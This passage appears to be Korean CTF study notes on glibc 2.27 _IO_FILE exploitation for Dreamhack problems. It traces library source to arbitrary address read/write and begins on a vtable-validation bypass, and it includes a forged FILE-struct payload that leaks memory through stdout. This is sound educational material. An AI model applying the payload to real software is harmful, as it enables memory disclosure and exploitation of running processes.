- `_IO_buf_end` : 덮어쓸 주소 + (버퍼 크기 이상의 값)  
- `_IO_fileno` : stdin(0), 입력을 주어 AAW를 하기 위함  
<br>

---

## _IO_FILE AAR (Dreamhack #366) - Arbitrary Address Read

드림핵 문제를 풀고 있기에 이번에도 glibc 2.27 버전을 기준으로 작성하겠다  

### Code Analysis (glibc 2.27)

대략적인 분석 방향은 이전 AAW와 거의 비슷하다  
위의 내용을 이해했다면 AAR도 추가적인 설명 없이 충분히 이해할 수 있기에 AAR는 AAW보다는 비교적 간단하게 써볼 예정이다  
<br>

---

#### _IO_fwrite()

```c
// /libio/iofwrite.c

_IO_size_t
_IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t request = size * count;
  _IO_size_t written = 0;
  CHECK_FILE (fp, 0);
  if (request == 0)
    return 0;
  _IO_acquire_lock (fp);
  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
    written = _IO_sputn (fp, (const char *) buf, request);
  _IO_release_lock (fp);
  /* We have written all of the input in case the return value indicates
     this or EOF is returned.  The latter is a special case where we
     simply did not manage to flush the buffer.  But the data is in the
     buffer and therefore written as far as fwrite is concerned.  */
  if (written == request || written == EOF)
    return count;
  else
    return written / size;
}
libc_hidden_def (_IO_fwrite)

# include <stdio.h>
weak_alias (_IO_fwrite, fwrite)
```

`fwrite()`를 호출하면 `_IO_fwrite()`와 같은 동작을 수행하게 된다  

`CHECK_FILE`로 `fp`를 먼저 검사하고 `_IO_sputn()`을 호출하게 되는데, 인자로는 `fp`, `buf`, `request`를 전달한다  
여기에 `fwrite()` 함수로 전달했던 인자들을 사용하는데 `buf`, `fp`는 `fwrite()`에 직접적으로 들어갔던 인자들이고, `request`는 `size`*`count`이다  

원래라면 `fp` 파일에 `buf`의 내용을 `size`*`count` 만큼 쓰는 동작을 하게 될 것이다  
<br>

---

#### _IO_sputn()

```c
// /libio/libioP.h

# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))

...

#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

...

#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)

...

#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
```

![Image](/assets/img/251102_0/_IO_file_xsputn.png)

`_IO_sgetn()`은 결국 `_IO_file_xsputn()` 함수를 호출하게 되는 것을 확인할 수 있다  
<br>

---

```c
// /libio/fileops.c

versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);
```

![Image](/assets/img/251102_0/_IO_new_file_xsputn.png)

`_IO_file_xsputn()`은 `_IO_new_file_xsputn()`과 같다  
`info symbol` 명령어로도 확인해볼 수 있다  
<br>

---

#### _IO_new_file_xsputn()

<details markdown="1">

<summary>전체 코드</summary>

```c
// /libio/fileops.c

_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const char *s = (const char *) data;
  _IO_size_t to_do = n;
  int must_flush = 0;
  _IO_size_t count = 0;

  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */

  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      count = f->_IO_buf_end - f->_IO_write_ptr;
      if (count >= n)
	{
	  const char *p;
	  for (p = s + n; p > s; )
	    {
	      if (*--p == '\n')
		{
		  count = p - s + 1;
		  must_flush = 1;
		  break;
		}
	    }
	}
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */

  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
	count = to_do;
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
      s += count;
      to_do -= count;
    }
  if (to_do + must_flush > 0)
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
	/* If nothing else has to be written we must not signal the
	   caller that everything has been written.  */
	return to_do == 0 ? EOF : n - to_do;

      /* Try to maintain alignment: write a whole number of blocks.  */
      block_size = f->_IO_buf_end - f->_IO_buf_base;
      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);

      if (do_write)
	{
	  count = new_do_write (f, s, do_write);
	  to_do -= count;
	  if (count < do_write)
	    return n - to_do;
	}

      /* Now write out the remainder.  Normally, this will fit in the
	 buffer, but it's somewhat messier for line-buffered files,
	 so we let _IO_default_xsputn handle the general case. */
      if (to_do)
	to_do -= _IO_default_xsputn (f, s+do_write, to_do);
    }
  return n - to_do;
}
libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)
```

</details>

이번에는 코드 분석과 함께 Up-to-Down을 약간 섞어 파일 구조체 조건까지 함께 보도록 한다  

일단 결론부터 말하면 `_IO_OVERFLOW()` 함수를 실행하여 AAR을 할 수 있다  
해당 함수를 실행하기 위해 앞의 조건들을 맞춰주어야 한다
<br>

---

```c
// /libio/fileops.c

_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
```

우선, `_IO_new_file_xsputn()` 함수에는 인자로, `f`, `data`, `n`이 들어간다  

각각 `fwrite()`에 전달한 인자와 매칭시키면 `fwrite()`의 `fp`는 `f`, `buf`는 `data` 그리고 `size`*`count`가 `n`에 매치된다   
<br>

---

```c
// /libio/fileops.c

if (n <= 0)
  return 0;
/* This is an optimized implementation.
    If the amount to be written straddles a block boundary
    (or the filebuf is unbuffered), use sys_write directly. */

/* First figure out how much space is available in the buffer. */
if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
  {
    count = f->_IO_buf_end - f->_IO_write_ptr;
    if (count >= n)
{
  const char *p;
  for (p = s + n; p > s; )
    {
      if (*--p == '\n')
  {
    count = p - s + 1;
    must_flush = 1;
    break;
  }
    }
}
  }
else if (f->_IO_write_end > f->_IO_write_ptr)
  count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
```

일단 당연히 `n`이 0이거나 음수이면 안 된다  
아무것도 안 쓰거나 뒤로 쓸 건 아니니까..  

~~플래그 값도 검증하고 이것저것 값들을 만지는데 사실상 `_IO_OVERFLOW()`까지 가는 데에는 영향이 없다고 봐도 될 것 같다~~  

`data`에 `n` 바이트가 다 들어간다면 해당 `n` 바이트 안에 개행 문자가 있는지 뒤에서부터 찾고, 만약 개행이 있다면 그 줄의 끝(개행 문자)까지만 write하고 flush하기 위해 `must_flush`를 1로 설정한다  
(다 들어가지 않는다면 `count`는 `fp` 구조체의 `_IO_buf_end`와 `_IO_write_ptr`의 차)  

플래그에 `_IO_LINE_BUF`(0x200)와 `_IO_CURRENTLY_PUTTING`(0x800)이 없다면 `count`는 `fp` 구조체의 `_IO_write_end`와 `_IO_write_ptr`의 차가 된다  
<br>

---

```c
// /libio/fileops.c

/* Then fill the buffer. */
if (count > 0)
  {
    if (count > to_do)
count = to_do;
    f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
    s += count;
    to_do -= count;
  }
if (to_do + must_flush > 0)
  {
    _IO_size_t block_size, do_write;
    /* Next flush the (full) buffer. */
    if (_IO_OVERFLOW (f, EOF) == EOF)
/* If nothing else has to be written we must not signal the
    caller that everything has been written.  */
return to_do == 0 ? EOF : n - to_do;
  }
```

`to_do`는 write해야 할 데이터의 크기로, `data`의 공간이 부족해 write하지 못한 남은 데이터가 있는 경우 그 남은 바이트가 `to_do`로 설정된다  

이렇게 버퍼에 다 못 넣어 남은 데이터가 있거나 `must_flush`가 1로 설정되어 있다면 `_IO_OVERFLOW()` 함수를 실행시킬 수 있다  

따라서, 이를 트리거하기 위해서는 `_IO_write_end`와 `_IO_write_ptr`을 잘 조작해서 `to_do`가 0보다 크도록 만들면 된다  
<br>

---

#### _IO_OVERFLOW

```c
// /libio/libioP.h

#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)

...

#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
```

```c
// /libio/fileops.c

versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);

...

  JUMP_INIT(overflow, _IO_file_overflow),
```

![Image](/assets/img/251102_0/_IO_file_overflow.png)

![Image](/assets/img/251102_0/_IO_new_file_overflow.png)

`_IO_OVERFLOW()`는 `_IO_file_overflow()`를 호출하게 되는 것을 알 수 있다  
`_IO_file_overflow()`는 `_IO_new_file_overflow()` 함수의 다른 이름이라고 봐도 무방하다  
<br>

---

<details markdown="1">

<summary>전체 코드</summary>

```c
// /libio/fileops.c

int
_IO_new_file_overflow (_IO_FILE *f, int ch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_IO_write_base == NULL)
	{
	  _IO_doallocbuf (f);
	  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	}
      /* Otherwise must be currently reading.
	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
	 logically slide the buffer forwards one block (by setting the
	 read pointers to all point at the beginning of the block).  This
	 makes room for subsequent output.
	 Otherwise, set the read pointers to _IO_read_end (leaving that
	 alone, so it can continue to correspond to the external position). */
      if (__glibc_unlikely (_IO_in_backup (f)))
	{
	  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
	  _IO_free_backup_area (f);
	  f->_IO_read_base -= MIN (nbackup,
				   f->_IO_read_base - f->_IO_buf_base);
	  f->_IO_read_ptr = f->_IO_read_base;
	}

      if (f->_IO_read_ptr == f->_IO_buf_end)
	f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
      f->_IO_write_ptr = f->_IO_read_ptr;
      f->_IO_write_base = f->_IO_write_ptr;
      f->_IO_write_end = f->_IO_buf_end;
      f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

      f->_flags |= _IO_CURRENTLY_PUTTING;
      if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
	f->_IO_write_end = f->_IO_write_ptr;
    }
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
  if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
    if (_IO_do_flush (f) == EOF)
      return EOF;
  *f->_IO_write_ptr++ = ch;
  if ((f->_flags & _IO_UNBUFFERED)
      || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
    if (_IO_do_write (f, f->_IO_write_base,
		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
      return EOF;
  return (unsigned char) ch;
}
libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)
```

</details>

```c
// /libio/fileops.c

_IO_new_file_overflow (_IO_FILE *f, int ch)
```

이전 코드의 `_IO_new_file_xsputn()` 함수에서도 확인했듯 `_IO_new_file_overflow()` 함수의 인자로는 `fp`와 `EOF`를 각각 `f`와 `ch`로 받는다  
<br>

---

```c
// /libio/fileops.c

if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
  {
    f->_flags |= _IO_ERR_SEEN;
    __set_errno (EBADF);
    return EOF;
  }
```

플래그에 쓰기 권한이 없어야 한다 (`_IO_NO_WRITES` = 0x8)  
EOF가 리턴되지 않게..  
<br>

---

```c
// /libio/fileops.c

if (ch == EOF)
  return _IO_do_write (f, f->_IO_write_base,
    f->_IO_write_ptr - f->_IO_write_base);
```

`_IO_do_write()`를 호출하게 해야 한다  
<br>

---

```c
// /libio/fileops.c

if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
  {
    /* Allocate a buffer if needed. */
    if (f->_IO_write_base == NULL)
{
  _IO_doallocbuf (f);
  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
}
    /* Otherwise must be currently reading.
  If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
  logically slide the buffer forwards one block (by setting the
  read pointers to all point at the beginning of the block).  This
  makes room for subsequent output.
  Otherwise, set the read pointers to _IO_read_end (leaving that
  alone, so it can continue to correspond to the external position). */
    if (__glibc_unlikely (_IO_in_backup (f)))
{
  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
  _IO_free_backup_area (f);
  f->_IO_read_base -= MIN (nbackup,
          f->_IO_read_base - f->_IO_buf_base);
  f->_IO_read_ptr = f->_IO_read_base;
}

    if (f->_IO_read_ptr == f->_IO_buf_end)
f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
    f->_IO_write_ptr = f->_IO_read_ptr;
    f->_IO_write_base = f->_IO_write_ptr;
    f->_IO_write_end = f->_IO_buf_end;
    f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;

    f->_flags |= _IO_CURRENTLY_PUTTING;
    if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
f->_IO_write_end = f->_IO_write_ptr;
  }
```

해당 조건문이 트리거되면 멤버값이 변경되므로 나중에 멤버값 조정하기 매우 귀찮아진다..  
이를 방지하기 위해 `_IO_CURRENTLY_PUTTING`(0x800)을 플래그로 설정하지 않도록 한다    
<br>

---

```c
// /libio/fileops.c

if (ch == EOF)
  return _IO_do_write (f, f->_IO_write_base,
      f->_IO_write_ptr - f->_IO_write_base);

...

versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);
```

![Image](/assets/img/251102_0/_IO_new_do_write.png)

`_IO_do_write()`는 `_IO_new_do_write()` 함수와 같다  

인자로 `f`, `f->_IO_write_base`, `f->_IO_write_ptr` - `f->_IO_write_base`를 전달한다  
<br>

---

#### _IO_new_do_write()

```c
// /libio/fileops.c

int
_IO_new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  return (to_do == 0
	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}
libc_hidden_ver (_IO_new_do_write, _IO_do_write)
```

```c
// /libio/fileops.c

static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  _IO_size_t count;
  if (fp->_flags & _IO_IS_APPENDING)
    /* On a system without a proper O_APPEND implementation,
       you would need to sys_seek(0, SEEK_END) here, but is
       not needed nor desirable for Unix- or Posix-like systems.
       Instead, just indicate that offset (before and after) is
       unpredictable. */
    fp->_offset = _IO_pos_BAD;
  else if (fp->_IO_read_end != fp->_IO_write_base)
    {
      _IO_off64_t new_pos
	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
	return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);
  if (fp->_cur_column && count)
    fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
  fp->_IO_write_end = (fp->_mode <= 0
		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
		       ? fp->_IO_buf_base : fp->_IO_buf_end);
  return count;
}
```

`_IO_new_do_write()`는 `new_do_write()`로 이어진다  
인자는 동일하다  

`_IO_read_end`와 `_IO_write_base`가 같으면 `_IO_SYSWRITE()`를 호출하게 된다  
만약 같지 않으면 `return 0`이 호출되는 것 같다  

`_IO_SYSWRITE()`의 함수로는 인자로 `fp`, `data`, `to_do`가 전달된다  
이 인자들은 `_IO_new_do_write()` 함수에서 받은 인자와 같다  
<br>

---

#### _IO_SYSWRITE()

![Image](/assets/img/251102_0/_IO_file_write.png)

```c
// /libio/fileops.c

versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);
```

`_IO_SYSWRITE()`는 `_IO_file_write()`함수를 호출하는 것을 볼 수 있다    
그리고 `_IO_file_write()`는 `_IO_new_file_write()`와 같다  

```c
// /libio/fileops.c

_IO_ssize_t
_IO_new_file_write (_IO_FILE *f, const void *data, _IO_ssize_t n)
{
  _IO_ssize_t to_do = n;
  while (to_do > 0)
    {
      _IO_ssize_t count = (__builtin_expect (f->_flags2
					     & _IO_FLAGS2_NOTCANCEL, 0)
			   ? __write_nocancel (f->_fileno, data, to_do)
			   : __write (f->_fileno, data, to_do));
      if (count < 0)
	{
	  f->_flags |= _IO_ERR_SEEN;
	  break;
	}
      to_do -= count;
      data = (void *) ((char *) data + count);
    }
  n -= to_do;
  if (f->_offset >= 0)
    f->_offset += n;
  return n;
}
```

`to_do`가 `n`이기 때문에 당연히 양수일 것이고 `__write()` 함수가 실행되게 된다  
<br>

---

#### __write()

![Image](/assets/img/251102_0/write.png)

플래그 조건이나 기타 조건들을 맞추어 디버깅해보면 `__write()` 함수는 `write()` 함수를 호출한다  
이를 사용해서 AAR을 할 수 있다  

특히 `write()`의 인자로 `f->_fileno`가 들어가는데 이 멤버값을 1로 조작하면 stdout으로 바꿀 수 있어서 특정 주소의 값을 stdout으로 출력 받아 AAR을 할 수 있다  
<br>

---

### Exploit

원리는 코드 분석과 함께 설명했으니 생략하고 페이로드만 조금 뜯어서 보자  

```python
_flags = 0xfbad0800,
_IO_read_ptr = 0x0,
_IO_read_end = target,
_IO_read_base = 0x0,
_IO_write_base = target,
_IO_write_ptr = target+0x100,
_IO_write_end = 0x0,
_IO_buf_base = 0x0,
_IO_buf_end = 0x0,
_IO_save_base = 0x0,
_IO_backup_base = 0x0,
_IO_save_end = 0x0,
_markers = 0x0,
_chain = 0x0,
_fileno = 0x1 # stdout

payload = flat(
    _flags,
    _IO_read_ptr, _IO_read_end, _IO_read_base,
    _IO_write_base, _IO_write_ptr, _IO_write_end,
    _IO_buf_base, _IO_buf_end,
    _IO_save_base, _IO_backup_base, _IO_save_end,
    _markers, _chain, _fileno
)
```

정리하면 다음과 같다  

- `_IO_write_base` : 읽을 주소   
- `_IO_read_end` : `_IO_write_base`와 같아야 한다  
- `_IO_write_ptr` : 읽을 주소 + (읽을 바이트 길이)   
- `_fineno` : stdout, 읽은 값 stdout으로 출력하여 AAR

다른 몇몇 글들에서는 `_flags`에 0x800 값을 OR하고 이 0x800이 `_IO_IS_APPENDING` 플래그라고 해놓았던데 `_IO_IS_APPENDING`은 0x1000이다..  
아마 한 명이 잘못 써서 다른 사람들도 잘못 알게 된 것 같은데 glibc 2.27 코드에서 0x800은 `_IO_CURRENTLY_PUTTING`의 값이다  
<br>

---

## _IO_FILE AW (Dreamhack #55) - Arbitrary Write

### Code Analysis (glibc 2.27)

#### _IO_fgets

```c
// /libio/iofgets.c

char *
_IO_fgets (char *buf, int n, _IO_FILE *fp)
{
  _IO_size_t count;
  char *result;
  int old_error;
  CHECK_FILE (fp, NULL);
  if (n <= 0)
    return NULL;
  if (__glibc_unlikely (n == 1))
    {
      /* Another irregular case: since we have to store a NUL byte and
	 there is only room for exactly one byte, we don't have to
	 read anything.  */
      buf[0] = '\0';
      return buf;
    }
  _IO_acquire_lock (fp);
  /* This is very tricky since a file descriptor may be in the
     non-blocking mode. The error flag doesn't mean much in this
     case. We return an error only when there is a new error. */
  old_error = fp->_IO_file_flags & _IO_ERR_SEEN;
  fp->_IO_file_flags &= ~_IO_ERR_SEEN;
  count = _IO_getline (fp, buf, n - 1, '\n', 1);
  /* If we read in some bytes and errno is EAGAIN, that error will
     be reported for next read. */
  if (count == 0 || ((fp->_IO_file_flags & _IO_ERR_SEEN)
		     && errno != EAGAIN))
    result = NULL;
  else
    {
      buf[count] = '\0';
      result = buf;
    }
  fp->_IO_file_flags |= old_error;
  _IO_release_lock (fp);
  return result;
}

weak_alias (_IO_fgets, fgets)
```

이전과 비슷하게 `fgets()` 함수를 호출하면 `_IO_fgets()`의 함수와 같은 동작을 수행한다  

인자로는 `buf` 포인터, `n`, `fp` 구조체 이렇게 3개를 받는다  
`fp` 구조체가 가리키는 파일에서 `n` 크기 만큼 데이터를 가져와 `buf`에 write하게 된다  
<br>

---

```c
old_error = fp->_IO_file_flags & _IO_ERR_SEEN;
fp->_IO_file_flags &= ~_IO_ERR_SEEN;
count = _IO_getline (fp, buf, n - 1, '\n', 1);
```

`count` 변수 값 계산하면서 `IO_getline()` 함수로 빠진다  

`fp` 구조체, `buf`와 3개 다른 값을 인자로 전달한다  
<br>

---

```c
// /libio/iogetline.c

_IO_size_t
_IO_getline (_IO_FILE *fp, char *buf, _IO_size_t n, int delim,
	     int extract_delim)
{
  return _IO_getline_info (fp, buf, n, delim, extract_delim, (int *) 0);
}
libc_hidden_def (_IO_getline)
```

`_IO_getline()` 함수는 다시 `_IO_getline_info()` 함수로 빠진다  
여기서 들어왔던 인자 순서가 살짝 바뀌어서 다시 들어간다  

일단 up-to-down 방식이니까 넘어가서 분석하도록 한다  
<br>

---

### _IO_sputbackc()

```c
// /libio/iogetline.c

_IO_size_t
_IO_getline_info (_IO_FILE *fp, char *buf, _IO_size_t n, int delim,
		  int extract_delim, int *eof)
{
  char *ptr = buf;
  if (eof != NULL)
    *eof = 0;
  if (__builtin_expect (fp->_mode, -1) == 0)
    _IO_fwide (fp, -1);
  while (n != 0)
    {
      _IO_ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr;
      if (len <= 0)
	{
	  int c = __uflow (fp);
	  if (c == EOF)
	    {
	      if (eof)
		*eof = c;
	      break;
	    }
	  if (c == delim)
	    {
 	      if (extract_delim > 0)
		*ptr++ = c;
	      else if (extract_delim < 0)
		_IO_sputbackc (fp, c);
	      if (extract_delim > 0)
		++len;
	      return ptr - buf;
	    }
	  *ptr++ = c;
	  n--;
	}
      else
	{
	  char *t;
	  if ((_IO_size_t) len >= n)
	    len = n;
	  t = (char *) memchr ((void *) fp->_IO_read_ptr, delim, len);
	  if (t != NULL)
	    {
	      _IO_size_t old_len = ptr-buf;
	      len = t - fp->_IO_read_ptr;
	      if (extract_delim >= 0)
		{
		  ++t;
		  if (extract_delim > 0)
		    ++len;
		}
	      memcpy ((void *) ptr, (void *) fp->_IO_read_ptr, len);
	      fp->_IO_read_ptr = t;
	      return old_len + len;
	    }
	  memcpy ((void *) ptr, (void *) fp->_IO_read_ptr, len);
	  fp->_IO_read_ptr += len;
	  ptr += len;
	  n -= len;
	}
    }
  return ptr - buf;
}
libc_hidden_def (_IO_getline_info)
```

`_IO_getline_info()` 함수는 `_IO_getline()` 함수 바로 아래에 같이 선언되어 있다  

(나중에 이어서 작성 예정)  
<br>

---

## bypass IO_validate_vtable (Dreamhack #365) - 

### Exploit

```c
// /libio/iofclose.c

int
_IO_new_fclose (_IO_FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect old streams
     here.  */
  if (_IO_vtable_offset (fp) != 0)
    return _IO_old_fclose (fp);
#endif

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  if (fp->_mode > 0)
    {
      /* This stream has a wide orientation.  This means we have to free
	 the conversion functions.  */
      struct _IO_codecvt *cc = fp->_codecvt;

      __libc_lock_lock (__gconv_lock);
      __gconv_release_step (cc->__cd_in.__cd.__steps);
      __gconv_release_step (cc->__cd_out.__cd.__steps);
      __libc_lock_unlock (__gconv_lock);
    }
  else
    {
      if (_IO_have_backup (fp))
	_IO_free_backup_area (fp);
    }
  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
    {
      fp->_IO_file_flags = 0;
      free(fp);
    }

  return status;
}

versioned_symbol (libc, _IO_new_fclose, _IO_fclose, GLIBC_2_1);
strong_alias (_IO_new_fclose, __new_fclose)
versioned_symbol (libc, __new_fclose, fclose, GLIBC_2_1);
```

`fclose()` = `_IO_new_fclose()`  

`fp` 구조체 `_IO_file_flags` 멤버(플래그)가 `_IO_IS_FILEBUF`(0x2000) 설정 되어 있으면 `_IO_file_close_it()` 함수 호출  
<br>

---

```c
int
_IO_new_file_close_it (_IO_FILE *fp)
{
  int write_status;
  if (!_IO_file_is_open (fp))
    return EOF;

  if ((fp->_flags & _IO_NO_WRITES) == 0
      && (fp->_flags & _IO_CURRENTLY_PUTTING) != 0)
    write_status = _IO_do_flush (fp);
  else
    write_status = 0;

  _IO_unsave_markers (fp);

  int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0
		      ? _IO_SYSCLOSE (fp) : 0);

  /* Free buffer. */
  if (fp->_mode > 0)
    {
      if (_IO_have_wbackup (fp))
	_IO_free_wbackup_area (fp);
      _IO_wsetb (fp, NULL, NULL, 0);
      _IO_wsetg (fp, NULL, NULL, NULL);
      _IO_wsetp (fp, NULL, NULL);
    }
  _IO_setb (fp, NULL, NULL, 0);
  _IO_setg (fp, NULL, NULL, NULL);
  _IO_setp (fp, NULL, NULL);

  _IO_un_link ((struct _IO_FILE_plus *) fp);
  fp->_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;
  fp->_fileno = -1;
  fp->_offset = _IO_pos_BAD;

  return close_status ? close_status : write_status;
}
libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)
```

`_IO_file_close_it()` = `_IO_new_file_close_it`  

`fp->_flags2` & `_IO_FLAGS2_NOCLOSE`(32 = 0x20)가 설정되어 있지 않아야 `_IO_SYSCLOSE()` 호출  
<br>

---

```c
// /libio/libioP.h

#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \
  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
				       + offsetof(TYPE, MEMBER)))

...

#define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)

...

# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))

...

#define JUMP0(FUNC, THIS) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS)

...

#define _IO_SYSCLOSE(FP) JUMP0 (__close, FP)

...

struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

`fp`에서 `vtable` 포인터를 꺼내고 그 안 특정 오프셋에 있는 함수 포인터를 호출하는 과정  

`_IO_SYSCLOSE(FP)`  
`JUMP0(__close,FP)`  
`(_IO_JUMPS_FUNC(FP)->__close)(__close)`  

`IO_validate_vtable(*(struct _IO_jump_t **)((void *) &_IO_JUMPS_FILE_plus (FP) + FP->_vtable_offset))`  
복잡하니 간단하게 나타내보면 `IO_validate_vtable(&_IO_JUMPS_FILE_plus(FP) + FP->_vtable_offset)`  
<br>

---

```c
// /libio/libioP.h

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

`_IO_JUMPS_FILE_plus(FP)`는 `_IO_FILE_plus` 구조체 형식으로 FP를 파싱 후 `vtable`의 주소를 반환한다  

그러니까 `IO_validate_vtable(&_IO_JUMPS_FILE_plus(FP) + FP->_vtable_offset)`는 다시 `IO_validate_vtable(vtable)`으로 간단하게 표현할 수 있다  
<br>

---

```c
// /libio/libioP.h

static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

